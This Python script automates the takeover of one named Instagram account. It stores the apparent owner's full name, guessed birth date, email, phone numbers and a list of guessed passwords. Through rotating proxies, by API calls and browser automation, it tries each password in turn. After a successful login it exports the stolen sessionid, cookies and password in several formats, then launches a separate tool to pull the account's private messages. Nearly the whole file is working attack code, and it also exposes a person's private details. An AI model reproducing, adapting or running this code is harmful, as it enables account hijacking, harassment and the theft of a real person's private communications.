# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Auto Login & SessionID Export System
Automatically logs into Instagram and exports sessionid after successful login
"""

import asyncio
import json
import time
import random
import requests
from playwright.async_api import async_playwright
import aiohttp
from datetime import datetime
import os
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AutoLoginExporter:
    def __init__(self):
        self.target_credentials = {
            "username": "alx.trading",
            "full_name": "Alex Fleming",
            "dob_guess": "1998-11-20",
            "email": "alex@tradeyourway.co.uk",
            "phone": ["+447793127209", "0615414210"],
            "known_passwords": [
                "Fleming654", "Fleming786", "Fleming1004",
                "Fleming1060", "Fleming1182", "Fleming1998",
                "alexfleming2024", "tradeyourway"
            ],
            "login_attempt_source": "DreamBruteMode"
        }

        self.proxies = self.load_proxies()
        self.session_exports = []

    def load_proxies(self):
        """Load proxy configurations"""
        try:
            with open('config/working_proxies.json', 'r') as f:
                return json.load(f)
        except Exception:
            return []

    def get_random_proxy(self):
        """Get random working proxy"""
        if self.proxies:
            return random.choice(self.proxies)
        return None

    async def attempt_direct_login(self, username, password, proxy=None):
        """Attempt direct API login"""
        try:
            session = requests.Session()

            if proxy:
                session.proxies = {
                    'http': f"http://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}",
                    'https': f"http://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"
                }

            # Get initial page
            response = session.get('https://www.instagram.com/')

            # Extract csrf token
            csrf_token = None
            for line in response.text.split('\n'):
                if 'csrf_token' in line and '"' in line:
                    csrf_token = line.split('"csrf_token":"')[1].split('"')[0]
                    break

            if not csrf_token:
                logger.warning("Could not extract CSRF token")
                return None

            # Login attempt
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/',
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            login_response = session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers
            )

            if login_response.status_code == 200:
                result = login_response.json()

                if result.get('authenticated'):
                    logger.info(f"✅ Direct login successful for {username}")

                    # Extract sessionid
                    sessionid = None
                    for cookie in session.cookies:
                        if cookie.name == 'sessionid':
                            sessionid = cookie.value
                            break

                    if sessionid:
                        await self.export_session(sessionid, username, password, 'direct_api')
                        return sessionid

                elif 'checkpoint_required' in result:
                    logger.warning(f"⚠️ Checkpoint required for {username}")
                    return "checkpoint_required"

                elif 'two_factor_required' in result:
                    logger.warning(f"⚠️ 2FA required for {username}")
                    return "2fa_required"

            return None

        except Exception as e:
            logger.error(f"Direct login error: {e}")
            return None

    async def attempt_playwright_login(self, username, password, proxy=None):
        """Attempt login using Playwright browser automation"""
        try:
            async with async_playwright() as p:
                # Launch browser with proxy if available
                browser_args = {
                    'headless': False,  # Show browser for debugging
                    'args': ['--no-sandbox', '--disable-dev-shm-usage']
                }

                if proxy:
                    browser_args['proxy'] = {
                        'server': f"http://{proxy['host']}:{proxy['port']}",
                        'username': proxy['username'],
                        'password': proxy['password']
                    }

                browser = await p.chromium.launch(**browser_args)
                context = await browser.new_context(
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                )

                page = await context.new_page()

                # Go to Instagram
                await page.goto('https://www.instagram.com/')
                await page.wait_for_timeout(3000)

                # Handle cookies popup
                try:
                    await page.click('button:has-text("Accept")', timeout=5000)
                except Exception:
                    pass

                # Wait for login form
                await page.wait_for_selector('input[name="username"]', timeout=10000)

                # Fill login form
                await page.fill('input[name="username"]', username)
                await page.wait_for_timeout(1000)

                await page.fill('input[name="password"]', password)
                await page.wait_for_timeout(1000)

                # Click login
                await page.click('button[type="submit"]')

                # Wait for login result
                await page.wait_for_timeout(5000)

                # Check if login was successful
                current_url = page.url

                if '/challenge/' in current_url:
                    logger.warning(f"⚠️ Challenge required for {username}")
                    await browser.close()
                    return "challenge_required"

                elif '/accounts/onetap/' in current_url or '/' == current_url.replace('https://www.instagram.com', ''):
                    logger.info(f"✅ Playwright login successful for {username}")

                    # Extract cookies
                    cookies = await context.cookies()
                    sessionid = None

                    for cookie in cookies:
                        if cookie['name'] == 'sessionid':
                            sessionid = cookie['value']
                            break

                    if sessionid:
                        await self.export_session(sessionid, username, password, 'playwright', cookies)
                        await browser.close()
                        return sessionid

                await browser.close()
                return None

        except Exception as e:
            logger.error(f"Playwright login error: {e}")
            return None

    async def export_session(self, sessionid, username, password, method, cookies=None):
        """Export sessionid in multiple formats"""
        timestamp = int(time.time())
        export_data = {
            'username': username,
            'sessionid': sessionid,
            'password_used': password,
            'extraction_method': method,
            'timestamp': timestamp,
            'datetime': datetime.now().isoformat(),
            'status': 'active'
        }

        # Export for different tools
        exports_dir = 'sessions_fresh'
        os.makedirs(exports_dir, exist_ok=True)

        # 1. Basic sessionid export
        basic_export = f"{exports_dir}/alx_trading_session_{timestamp}.json"
        with open(basic_export, 'w') as f:
            json.dump(export_data, f, indent=2)

        # 2. Playwright cookies format
        if cookies:
            playwright_export = f"{exports_dir}/alx_trading_cookies_{timestamp}.json"
            with open(playwright_export, 'w') as f:
                json.dump(cookies, f, indent=2)

        # 3. Tools compatible format
        tools_export = f"tools/session_alx_trading.json"
        os.makedirs('tools', exist_ok=True)

        tools_format = {
            'sessionid': sessionid,
            'username': username,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'csrf_token': '',
            'cookies': cookies if cookies else [],
            'extraction_method': method,
            'timestamp': timestamp
        }

        with open(tools_export, 'w') as f:
            json.dump(tools_format, f, indent=2)

        # 4. Request headers format
        headers_export = f"{exports_dir}/alx_trading_headers_{timestamp}.json"
        headers_format = {
            'Cookie': f'sessionid={sessionid}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest'
        }

        with open(headers_export, 'w') as f:
            json.dump(headers_format, f, indent=2)

        logger.info(f"📤 Session exported to multiple formats:")
        logger.info(f"   - Basic: {basic_export}")
        logger.info(f"   - Tools: {tools_export}")
        logger.info(f"   - Headers: {headers_export}")
        if cookies:
            logger.info(f"   - Playwright: {playwright_export}")

        self.session_exports.append(export_data)

    async def validate_session(self, sessionid):
        """Validate extracted sessionid"""
        try:
            headers = {
                'Cookie': f'sessionid={sessionid}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            }

            response = requests.get('https://www.instagram.com/accounts/edit/', headers=headers)

            if response.status_code == 200 and 'alx.trading' in response.text:
                logger.info("✅ Session validation successful!")
                return True
            else:
                logger.warning("⚠️ Session validation failed")
                return False

        except Exception as e:
            logger.error(f"Session validation error: {e}")
            return False

    async def run_auto_extraction(self):
        """Run automated DM extraction after successful login"""
        try:
            logger.info("🚀 Starting automated DM extraction...")

            # Run our DM extractor
            import subprocess
            result = subprocess.run(['python3', 'playwright_dm_extractor.py'],
                                  capture_output=True, text=True)

            if result.returncode == 0:
                logger.info("✅ Automated DM extraction completed!")
                logger.info(result.stdout)
            else:
                logger.error("❌ DM extraction failed:")
                logger.error(result.stderr)

        except Exception as e:
            logger.error(f"Auto extraction error: {e}")

    async def main(self):
        """Main execution flow"""
        logger.info("🎯 Starting Auto Login & SessionID Export System")
        logger.info(f"Target: {self.target_credentials['username']}")

        username = self.target_credentials['username']
        passwords = self.target_credentials['known_passwords']

        for i, password in enumerate(passwords):
            logger.info(f"🔐 Attempting login {i+1}/{len(passwords)} with password: {password[:4]}***")

            # Try direct API login first
            proxy = self.get_random_proxy()
            result = await self.attempt_direct_login(username, password, proxy)

            if result and result not in ['checkpoint_required', '2fa_required']:
                logger.info("✅ Direct API login successful!")

                # Validate session
                if await self.validate_session(result):
                    logger.info("🎉 Session validated! Starting auto extraction...")
                    await self.run_auto_extraction()
                    return result

            # If direct login fails, try Playwright
            logger.info("🌐 Trying Playwright browser automation...")
            result = await self.attempt_playwright_login(username, password, proxy)

            if result and result not in ['challenge_required']:
                logger.info("✅ Playwright login successful!")

                # Validate session
                if await self.validate_session(result):
                    logger.info("🎉 Session validated! Starting auto extraction...")
                    await self.run_auto_extraction()
                    return result

            # Wait between attempts
            wait_time = random.randint(10, 30)
            logger.info(f"⏱️ Waiting {wait_time}s before next attempt...")
            await asyncio.sleep(wait_time)

        logger.error("❌ All login attempts failed")
        return None

if __name__ == "__main__":
    exporter = AutoLoginExporter()
    result = asyncio.run(exporter.main())

    if result:
        print(f"\n🎉 SUCCESS! SessionID exported: {result[:20]}...")
        print("\n📁 Exported files:")
        print("   - tools/session_alx_trading.json (for extractors)")
        print("   - sessions_fresh/alx_trading_* (multiple formats)")
        print("\n🚀 Ready for DM extraction!")
    else:
        print("\n❌ Failed to extract sessionid")
        print("💡 Try running with different proxies or manual browser login")
